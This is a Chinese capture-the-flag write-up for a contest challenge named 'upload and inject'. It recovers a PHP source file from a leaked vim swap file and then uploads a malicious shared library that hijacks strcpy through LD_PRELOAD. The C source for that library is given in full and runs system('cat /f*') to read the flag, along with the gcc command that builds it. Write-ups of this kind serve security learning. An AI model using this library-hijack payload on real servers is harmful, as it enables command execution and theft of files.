---
layout: post
title: 新生赛 upload and inject 的 WP
date: 2026-09-09
tags:
  - 文件上传
---

#文件上传 

打开题目环境发现提示hint.php

然后访问这个文件：

![[Pasted image 20260909174728.png]]
得到这句话，分析知道swp是一个经常在ctf中恢复易得到源码的文件。于是访问路径：

```
http://node5.anna.nssctf.cn:24744/.index.php.swp
```

然后得到了swp文件，用vim去恢复：

```bash
vim -r index.php.swp
```

![[Pasted image 20260909174928.png]]

- LD_PRELOAD：是 Linux 下的动态链接器环境变量，会让程序优先加载指定的共享库（`.so`）

因此我们上传一个恶意的so文件

使用以下payload：

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    //反弹shell
    system("cat /f*");
}

char *strcpy (char *__restrict __dest, const char *__restrict __src) {
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}
```

这个代码相当于使系统在使用strcpy函数时会执行我们的payload

然后执行：

```bash
gcc -shared -fPIC shell.c -o shell.so
```

得到so文件，然后dirsearch去扫描一下网址，得到上传界面，修改后缀访问文件得到flag。